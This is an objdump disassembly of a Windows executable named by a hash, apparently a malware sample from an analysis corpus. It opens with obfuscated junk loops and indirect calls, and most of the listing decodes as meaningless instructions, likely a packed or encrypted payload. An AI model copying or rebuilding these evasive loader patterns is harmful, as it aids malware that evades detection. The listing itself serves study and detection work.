
a947824fcd316cbf1bed1f714178c783f3d3d979ed9553ee2c08a67603b5ea8f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	adc    eax,0x709c87b0
  4012f8:	jo     0x40136a
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	outs   dx,BYTE PTR ds:[esi]
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	cmp    ebp,DWORD PTR [eax-0x4]
  4013aa:	adc    DWORD PTR [esp+eiz*2],edx
  4013ad:	pop    ss
  4013ae:	cmp    ch,al
  4013b0:	enter  0x3a30,0x91
  4013b4:	push   ss
  4013b5:	inc    edi
  4013b6:	test   DWORD PTR [edi-0x133c441f],ebp
  4013bc:	cmc    
  4013bd:	loop   0x401401
  4013bf:	cdq    
  4013c0:	imul   ebp,DWORD PTR [edi+0x71b319ee],0xfe6b6d7b
  4013ca:	push   edx
  4013cb:	in     eax,dx
  4013cc:	bound  edi,QWORD PTR [ebp-0x4b]
  4013cf:	call   0x18c4:0x33e50d2c
  4013d6:	sbb    al,0x4e
  4013d8:	(bad)  
  4013d9:	and    BYTE PTR [edi+0x30],al
  4013dc:	in     eax,0xc3
  4013de:	lods   al,BYTE PTR ds:[esi]
  4013df:	add    al,0x95
  4013e1:	push   edx
  4013e2:	sbb    BYTE PTR [ecx+0x3b49550c],ch
  4013e8:	pop    eax
  4013e9:	inc    edi
  4013ea:	mov    eax,0xa43700d2
  4013ef:	push   cs
  4013f0:	ins    DWORD PTR es:[edi],dx
  4013f1:	dec    ecx
  4013f2:	sub    ch,bl
  4013f4:	xchg   ebp,eax
  4013f5:	mov    eax,DWORD PTR [ecx]
  4013f7:	and    bh,al
  4013f9:	and    BYTE PTR ds:0x85578f9,dh
  4013ff:	out    0x69,eax
  401401:	in     al,dx
  401402:	or     eax,0x76864e5d
  401407:	adc    BYTE PTR [edi+0x77df088f],bh
  40140d:	cwde   
  40140e:	(bad)  
  40140f:	xor    al,0x4f
  401411:	jl     0x40148f
  401413:	inc    ebp
  401414:	push   edi
  401415:	sub    eax,0xfdcc9cd5
  40141a:	ficom  WORD PTR [eax+0x69]
  40141d:	xchg   BYTE PTR [edx+0x14],dl
  401420:	test   al,0x62
  401422:	jge    0x40140a
  401424:	and    ah,BYTE PTR [esi+0x1]
  401427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401428:	or     dh,ah
  40142a:	sub    BYTE PTR [ecx],bl
  40142c:	add    edi,DWORD PTR [ebx+0x5d]
  40142f:	stc    
  401430:	in     al,0x19
  401432:	fiadd  WORD PTR [ecx+0x52]
  401435:	jecxz  0x401450
  401437:	fist   DWORD PTR [eax]
  401439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40143a:	stc    
  40143b:	bound  esp,QWORD PTR ds:0xa1f394c6
  401441:	or     bl,BYTE PTR [ebx+edx*8-0x21]
  401445:	test   DWORD PTR [edx-0x53],esp
  401448:	push   ecx
  401449:	dec    esi
  40144a:	or     al,0x20
  40144c:	jno    0x40146d
  40144e:	mov    ah,0xab
  401450:	scas   eax,DWORD PTR es:[edi]
  401451:	cmp    ecx,DWORD PTR [eax-0x80]
  401454:	push   eax
  401455:	stos   BYTE PTR es:[edi],al
  401456:	scas   al,BYTE PTR es:[edi]
  401457:	cmp    dl,BYTE PTR [ebp+0x4d]
  40145a:	mov    dh,0x38
  40145c:	mov    esi,0x3a94976e
  401461:	call   0xff961af9
  401466:	mov    esi,0x35d81fae
  40146b:	add    ch,BYTE PTR ds:0x58a2ea26
  401471:	pop    eax
  401472:	fisubr DWORD PTR [edi]
  401474:	push   0x56ff6df4
  401479:	xchg   edx,eax
  40147a:	push   edi
  40147b:	mov    dl,0x5
  40147d:	loop   0x401452
  40147f:	xchg   ebx,eax
  401480:	and    eax,edx
  401482:	pop    ebp
  401483:	mov    edi,DWORD PTR [ecx+0xab2024e]
  401489:	sbb    ecx,ecx
  40148b:	or     al,0xdb
  40148d:	scas   eax,DWORD PTR es:[edi]
  40148e:	fadd   DWORD PTR [eax+0x3b8ea925]
  401494:	mov    WORD PTR [edx-0x5f],?
  401497:	jb     0x4014f4
  401499:	in     al,dx
  40149a:	retf   
  40149b:	or     al,0xc1
  40149d:	fld    QWORD PTR [edx+0x3902d413]
  4014a3:	dec    eax
  4014a4:	sbb    BYTE PTR [esi+0x3a7f68c],0xe1
  4014ab:	dec    esp
  4014ac:	or     al,BYTE PTR [edi]
  4014ae:	dec    DWORD PTR [ebp+0x4a]
  4014b1:	cmp    edi,DWORD PTR [ebp+0x59bb637d]
  4014b7:	add    ah,cl
  4014b9:	rcr    DWORD PTR [edx+0x55],0xcf
  4014bd:	jle    0x4014c8
  4014bf:	lahf   
  4014c0:	(bad)  
  4014c1:	out    dx,al
  4014c2:	inc    eax
  4014c3:	or     edi,DWORD PTR ds:0x4405a90a
  4014c9:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4014cb:	push   es
  4014cc:	xor    eax,0x45b9428f
  4014d1:	xor    DWORD PTR [ebx-0xa8ee59d],esi
  4014d7:	pushf  
  4014d8:	sbb    ebx,esp
  4014da:	repz cmp DWORD PTR fs:0xcd3ec000,edi
  4014e2:	jb     0x4014cf
  4014e4:	(bad)  
  4014e5:	pop    ebx
  4014e6:	xchg   DWORD PTR [eax+0x62],edi
  4014e9:	push   eax
  4014ea:	stos   DWORD PTR es:[edi],eax
  4014eb:	inc    esp
  4014ec:	leave  
  4014ed:	sar    DWORD PTR [edi-0xe],1
  4014f0:	in     eax,dx
  4014f1:	aad    0x2
  4014f3:	stos   DWORD PTR es:[edi],eax
  4014f4:	and    al,0x6
  4014f6:	les    ecx,FWORD PTR [ebp+0x10]
  4014f9:	dec    ebx
  4014fa:	stos   BYTE PTR es:[edi],al
  4014fb:	nop
  4014fc:	(bad)  
  4014fd:	je     0x4014f2
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x6e5ce013]
  401516:	jne    0x40153d
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	shl    BYTE PTR [ebx+0x5ba70ae0],cl
  401526:	cmc    
  401527:	leave  
  401528:	jge    0x4014f1
  40152a:	idiv   BYTE PTR [ebx]
  40152c:	ror    BYTE PTR [esi+0x421cf840],0xad
  401533:	jmp    0xf638:0x32dbd381
  40153a:	push   ss
  40153b:	sbb    bh,cl
  40153d:	sub    eax,0xb238157c
  401542:	jbe    0x40154f
  401544:	sbb    ebx,DWORD PTR [edx-0x20b3a126]
  40154a:	imul   ecx,DWORD PTR gs:[esi+0x6d],0x6c81a49c
  401552:	std    
  401553:	sub    BYTE PTR [ebp+0x1d],dl
  401556:	pop    eax
  401557:	data16 (bad) 
  401559:	adc    DWORD PTR [edx],eax
  40155b:	hlt    
  40155c:	mov    dh,dh
  40155e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40155f:	test   DWORD PTR [ebx-0x61],eax
  401562:	sbb    edi,esp
  401564:	js     0x401537
  401566:	cmp    al,0x43
  401568:	dec    ecx
  401569:	cld    
  40156a:	pop    ebp
  40156b:	es cdq 
  40156d:	sbb    eax,0x2049eab9
  401572:	pusha  
  401573:	iret   
  401574:	push   edi
  401575:	xchg   ecx,ecx
  401577:	pusha  
  401578:	test   al,0x30
  40157a:	lea    eax,[eax]
  40157c:	bound  esp,QWORD PTR [edi+0x5e9aa6e2]
  401582:	mov    al,ds:0x674b2ac4
  401587:	aam    0xc4
  401589:	(bad)  [eax+0x45c2538b]
  40158f:	fsubp  st(7),st
  401591:	xchg   ebx,eax
  401592:	mov    bh,0x8f
  401594:	inc    esi
  401595:	mov    edi,0xbfb59983
  40159a:	out    0x37,al
  40159c:	lods   al,BYTE PTR ds:[esi]
  40159d:	mov    ds:0x46258fc0,al
  4015a2:	pop    esi
  4015a3:	pop    esp
  4015a4:	cmp    al,0xca
  4015a6:	sti    
  4015a7:	add    DWORD PTR [edi+0x65974a89],eax
  4015ad:	je     0x4015ac
  4015af:	clc    
  4015b0:	jmp    0x1b7b0ee6
  4015b5:	fbstp  TBYTE PTR [edi+edx*2-0x25]
  4015b9:	push   edi
  4015ba:	mov    esp,0xcfe6aed5
  4015bf:	imul   eax,DWORD PTR [ebx],0xdb1d30b5
  4015c5:	fwait
  4015c6:	cli    
  4015c7:	fsubp  st(5),st
  4015c9:	xor    bl,BYTE PTR [ebx+0x5653554e]
  4015cf:	ja     0x4015c5
  4015d1:	jns    0x401626
  4015d3:	or     al,BYTE PTR [ecx+edx*1+0x35]
  4015d7:	adc    BYTE PTR [esi+eiz*1-0x233dc64f],cl
  4015de:	addr16 jnp 0x4015b1
  4015e1:	jb     0x4015f0
  4015e3:	jb     0x40165c
  4015e5:	and    DWORD PTR [ebp+edi*4-0x32464ad8],ebx
  4015ec:	mov    esp,0x8884f7e
  4015f1:	rcl    al,1
  4015f3:	loope  0x4015de
  4015f5:	jl     0x40158a
  4015f7:	dec    edi
  4015f8:	call   0x1adc:0x1afb1a74
  4015ff:	mov    edi,0x8e4cc63c
  401604:	mov    al,ds:0x38d79e7
  401609:	jecxz  0x40160d
  40160b:	mov    cs,WORD PTR [ebp+0x7b0a6978]
  401611:	jne    0x4015a2
  401613:	popa   
  401614:	push   DWORD PTR [edx]
  401616:	fild   WORD PTR [edx-0x19b4c160]
  40161c:	inc    ebp
  40161d:	cmp    ebp,edx
  40161f:	out    dx,eax
  401620:	adc    ecx,DWORD PTR [edi+0xe]
  401623:	jmp    0x8a6bc6fd
  401628:	rcr    DWORD PTR [edx+0x22],0x50
  40162c:	lahf   
  40162d:	mov    eax,0x7b4e3b2e
  401632:	(bad)  
  401633:	in     al,0x5d
  401635:	inc    ebx
  401636:	add    BYTE PTR [edx+0x66],0x2
  40163a:	out    0x76,al
  40163c:	rcr    ah,0x2e
  40163f:	sub    DWORD PTR [edx+0x37501030],esp
  401645:	push   esp
  401646:	das    
  401647:	sbb    al,0x7f
  401649:	or     DWORD PTR [edx-0x2f],0x814f7b97
  401650:	and    bh,BYTE PTR [ebx+0x26]
  401653:	sub    edx,DWORD PTR [edi-0x3a]
  401656:	add    BYTE PTR [esi+0x67],cl
  401659:	loopne 0x401664
  40165b:	fisub  DWORD PTR ds:0xd6c4e16
  401661:	or     cl,ah
  401663:	test   eax,0xcf93886c
  401668:	rcr    BYTE PTR [eax+0x45b52bee],0xbc
  40166f:	push   ebp
  401670:	out    dx,al
  401671:	cmp    al,0x11
  401673:	(bad)  
  401674:	retf   0x5332
  401677:	popf   
  401678:	and    eax,0x4eb2a0e3
  40167d:	test   DWORD PTR [edi+0x191a5332],ebx
  401683:	sub    DWORD PTR [ebx],esp
  401685:	dec    ecx
  401686:	lods   al,BYTE PTR ds:[esi]
  401687:	out    dx,al
  401688:	mov    cl,0x58
  40168a:	retf   0xdfff
  40168d:	dec    eax
  40168e:	sub    DWORD PTR [edx],esp
  401690:	push   cs
  401691:	inc    edi
  401692:	mov    ds:0x9fbc3696,al
  401697:	add    eax,0x98457478
  40169c:	pushf  
  40169d:	add    cl,BYTE PTR [eax]
  40169f:	retf   0xac43
  4016a2:	inc    esi
  4016a3:	jb     0x401654
  4016a5:	repz les ebp,FWORD PTR [ebp-0x28]
  4016a9:	add    ebp,DWORD PTR [edi+0x7b]
  4016ac:	xor    al,0x74
  4016ae:	out    0xe0,eax
  4016b0:	scas   eax,DWORD PTR es:[edi]
  4016b1:	(bad)
  4016b4:	dec    esp
  4016b5:	and    dl,BYTE PTR [ecx]
  4016b7:	pop    ds
  4016b8:	xor    BYTE PTR [ebx+0x6e],0x8
  4016bc:	lods   al,BYTE PTR ds:[esi]
  4016bd:	add    al,0x3d
  4016bf:	dec    ebp
  4016c0:	pop    ecx
  4016c1:	sahf   
  4016c2:	sti    
  4016c3:	inc    eax
  4016c4:	sbb    esi,DWORD PTR [esi+0x14bd127c]
  4016ca:	mov    BYTE PTR [eax+0x297975c],dh
  4016d0:	mov    edi,0xb046e39e
  4016d5:	inc    edi
  4016d6:	jmp    0x1651d5e4
  4016db:	aaa    
  4016dc:	cld    
  4016dd:	inc    ebp
  4016de:	ret    0xb2d8
  4016e1:	xchg   edx,eax
  4016e2:	shr    DWORD PTR [ecx+0x252c382e],1
  4016e8:	gs cli 
  4016ea:	xchg   ecx,eax
  4016eb:	nop
  4016ec:	sti    
  4016ed:	inc    ecx
  4016ee:	(bad)  
  4016ef:	xlat   BYTE PTR ds:[ebx]
  4016f0:	in     eax,dx
  4016f1:	xor    esp,DWORD PTR [eax]
  4016f3:	cmp    eax,0x30c81a46
  4016f9:	adc    esi,DWORD PTR [edi-0x2a]
  4016fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016fd:	out    0x3b,al
  4016ff:	pop    esp
  401700:	lods   eax,DWORD PTR ds:[esi]
  401701:	add    DWORD PTR [ebp-0x7b],0x74252268
  401708:	pop    ebx
  401709:	pop    eax
  40170a:	cmp    ecx,0xfc3f1773
  401710:	jmp    0x66a6:0x24a413a
  401717:	mov    ecx,0xefc7185e
  40171c:	push   esi
  40171d:	into   
  40171e:	and    ah,0x8d
  401721:	inc    ebp
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	dec    edi
  401741:	add    cl,BYTE PTR [esp+eax*8+0x70707c70]
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	(bad)  
  40174d:	or     eax,ebp
  40174f:	xor    eax,0x58999ca3
  401754:	aaa    
  401755:	sar    DWORD PTR [ebp+0x72],0x9c
  401759:	dec    esp
  40175a:	(bad)  
  40175b:	xchg   esp,eax
  40175c:	mov    ecx,0xf350cd1c
  401761:	xor    BYTE PTR [esi],bh
  401763:	mov    edx,0x44e70566
  401768:	aam    0x18
  40176a:	xchg   DWORD PTR [ebp+0x6310cbcc],ecx
  401770:	ins    DWORD PTR es:[edi],dx
  401771:	test   al,0x90
  401773:	adc    edi,DWORD PTR [eax]
  401775:	es lahf 
  401777:	cmp    BYTE PTR [eax-0x6c07ac54],0x31
  40177e:	daa    
  40177f:	pop    eax
  401780:	inc    edx
  401781:	push   edi
  401782:	outs   dx,BYTE PTR ds:[esi]
  401783:	dec    ebx
  401784:	mov    dh,0x83
  401786:	dec    edx
  401787:	test   eax,0xa3961fdf
  40178c:	imul   ebx,DWORD PTR [edx+0x23],0x57
  401790:	adc    esi,ebx
  401792:	add    ebx,edx
  401794:	mov    ebx,edi
  401796:	mov    WORD PTR [ecx-0x4b46f48],?
  40179c:	and    dh,BYTE PTR [edi+0x12b3b8ea]
  4017a2:	and    cl,bh
  4017a4:	and    DWORD PTR [eax+0x61],ebx
  4017a7:	les    eax,FWORD PTR es:[ecx-0x6c37db11]
  4017ae:	data16 jbe 0x4017be
  4017b1:	mov    bh,BYTE PTR ds:0x2b090e1
  4017b7:	xlat   BYTE PTR ds:[ebx]
  4017b8:	addr16 pop ss
  4017ba:	push   edi
  4017bb:	sub    eax,0xe17bc468
  4017c0:	xlat   BYTE PTR es:[ebx]
  4017c2:	add    bh,ah
  4017c4:	xor    DWORD PTR [edi],esp
  4017c6:	mov    WORD PTR [edx+0x9],es
  4017c9:	pop    ds
  4017ca:	push   eax
  4017cb:	(bad)  
  4017cc:	xor    al,0xc2
  4017ce:	xchg   edx,eax
  4017cf:	inc    edi
  4017d0:	jo     0x401780
  4017d2:	cmp    esp,ebx
  4017d4:	mov    esp,0xb3eceb7
  4017d9:	jb     0x4017ab
  4017db:	mov    esp,0xd7b55397
  4017e0:	call   0x963adf7b
  4017e5:	and    eax,DWORD PTR [ebx+0x55]
  4017e8:	repnz icebp 
  4017ea:	jbe    0x40184f
  4017ec:	repz cmc 
  4017ee:	cmp    BYTE PTR [edx+0x2e36e46],bh
  4017f4:	shl    DWORD PTR [eax+0x140e5c1a],0x5e
  4017fb:	js     0x401792
  4017fd:	mov    al,ds:0x975602c4
  401802:	sub    eax,0x1e045ded
  401807:	xor    eax,0x40c1180c
  40180c:	adc    al,0x4e
  40180e:	mov    ah,0xdb
  401810:	xlat   BYTE PTR ds:[ebx]
  401811:	cdq    
  401812:	lahf   
  401813:	in     al,dx
  401814:	inc    ebp
  401815:	rcl    BYTE PTR ds:0x3bf9,cl
  40181a:	fmul   DWORD PTR ds:0xdbd6eef3
  401820:	sub    al,0x94
  401822:	inc    eax
  401823:	pop    edx
  401824:	ja     0x4018a2
  401826:	xchg   DWORD PTR [edx+0x60148eb8],esp
  40182c:	sbb    bl,dh
  40182e:	sub    ebx,ebx
  401830:	adc    cl,BYTE PTR [ebx-0x4e351a3b]
  401836:	mov    DWORD PTR [edi-0x60d0ee3d],edi
  40183c:	mov    ecx,ebp
  40183e:	jmp    0xa678:0xaa57f610
  401845:	les    esp,FWORD PTR [ebx-0x5cc1dfcb]
  40184b:	hlt    
  40184c:	cmp    ecx,DWORD PTR [eax+0x1e]
  40184f:	mov    ebp,ds
  401851:	pop    es
  401852:	call   0xbd5ddea6
  401857:	dec    esp
  401858:	xor    al,0x6d
  40185a:	in     eax,0xe3
  40185c:	jno    0x401857
  40185e:	out    0x55,al
  401860:	and    BYTE PTR [ebp+0x75f74164],0xd1
  401867:	pop    ss
  401868:	mov    ch,0xdd
  40186a:	scas   al,BYTE PTR es:[edi]
  40186b:	dec    ebp
  40186c:	xor    al,BYTE PTR [eax-0x5f]
  40186f:	add    eax,0x5eacaf2b
  401874:	pop    es
  401875:	addr16 adc edx,ecx
  401878:	ffreep st(5)
  40187a:	and    eax,0x760ac6b1
  40187f:	push   ebx
  401880:	test   eax,0x568d82d4
  401885:	jge    0x401899
  401887:	lods   eax,DWORD PTR ds:[esi]
  401888:	jmp    0x3e7f0e17
  40188d:	scas   al,BYTE PTR es:[edi]
  40188e:	shr    DWORD PTR [ecx+0x4ca7ee42],cl
  401894:	fwait
  401895:	sub    ch,ah
  401897:	pushf  
  401898:	stos   BYTE PTR es:[edi],al
  401899:	pop    esi
  40189a:	jb     0x4018dc
  40189c:	lds    esi,FWORD PTR [eax-0x56]
  40189f:	mov    ds:0xe3053d92,al
  4018a4:	and    eax,0x23af62ac
  4018a9:	push   ebp
  4018aa:	push   edx
  4018ab:	and    dh,ah
  4018ad:	bound  esp,QWORD PTR es:[esi]
  4018b0:	call   0x1f94:0x838fec48
  4018b7:	stos   DWORD PTR es:[edi],eax
  4018b8:	loopne 0x401901
  4018ba:	fldenv [edx]
  4018bc:	das    
  4018bd:	fmul   QWORD PTR [esi-0x5b]
  4018c0:	pop    ds
  4018c1:	mov    ah,0x8a
  4018c3:	repz mov eax,gs:0x607d3afb
  4018ca:	scas   eax,DWORD PTR es:[edi]
  4018cb:	mov    fs,WORD PTR [ebp+0x59]
  4018ce:	adc    eax,ecx
  4018d0:	mov    ds:0xbccbbc11,al
  4018d5:	xchg   ecx,eax
  4018d6:	inc    edi
  4018d7:	mov    edi,0x7ed95e4f
  4018dc:	adc    ebx,ebx
  4018de:	jp     0x401886
  4018e0:	fwait
  4018e1:	dec    esp
  4018e2:	fwait
  4018e3:	push   0x13
  4018e5:	test   al,0xa7
  4018e7:	mov    ah,0x3f
  4018e9:	lahf   
  4018ea:	out    0xe5,eax
  4018ec:	hlt    
  4018ed:	push   ebx
  4018ee:	and    DWORD PTR [edi+0x6f78e2f1],esp
  4018f4:	mov    BYTE PTR [edi+0x22],bl
  4018f7:	in     eax,0x79
  4018f9:	xor    eax,esi
  4018fb:	push   ss
  4018fc:	mov    al,0x83
  4018fe:	in     al,0xa2
  401900:	ret    
  401901:	push   ss
  401902:	cld    
  401903:	jmp    DWORD PTR fs:[ebx-0x74c9582e]
  40190a:	cmp    eax,0xf394b74c
  40190f:	shl    esi,cl
  401911:	pop    esi
  401912:	mov    esp,0x4c7fd06a
  401917:	or     eax,0x82e09fac
  40191c:	fisttp DWORD PTR [eax-0x24b2a77c]
  401922:	int3   
  401923:	cwde   
  401924:	mov    ch,0x16
  401926:	pop    ebx
  401927:	pop    ebp
  401928:	or     dh,BYTE PTR [esi]
